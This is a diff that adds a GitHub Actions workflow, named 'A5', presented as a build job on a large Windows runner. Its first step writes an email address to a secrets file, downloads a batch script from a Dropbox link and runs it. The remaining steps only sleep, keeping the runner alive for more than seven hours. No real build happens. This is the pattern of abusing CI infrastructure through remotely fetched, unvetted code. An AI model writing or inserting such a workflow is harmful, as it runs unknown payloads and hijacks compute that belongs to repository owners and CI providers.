@@ -1,0 +1,48 @@
+name: A5
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest-large
+
+    steps:
+      - name: Downloading & Setting Up
+        run: |
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/3fv6r025lzn92gv6atbbu/down.bat?rlkey=ti46bzfu0kss1kvcoazxe7iab&dl=1" -OutFile "down.bat"
+         cmd /c down.bat
+
+      - name: A
+        run: Start-sleep -Seconds 600
+
+      - name: B
+        run: Start-sleep -Seconds 600
+
+      - name: C
+        run: Start-sleep -Seconds 600
+
+      - name: D
+        run: Start-sleep -Seconds 600
+
+      - name: E
+        run: Start-sleep -Seconds 600
+
+      - name: F
+        run: Start-sleep -Seconds 600
+
+      - name: G
+        run: Start-sleep -Seconds 600
+
+      - name: H
+        run: Start-sleep -Seconds 600
+
+      - name: I
+        run: Start-sleep -Seconds 600
+
+      - name: J
+        run: Start-sleep -Seconds 600
+
+      - name: K
+        run: Start-sleep -Seconds 21600
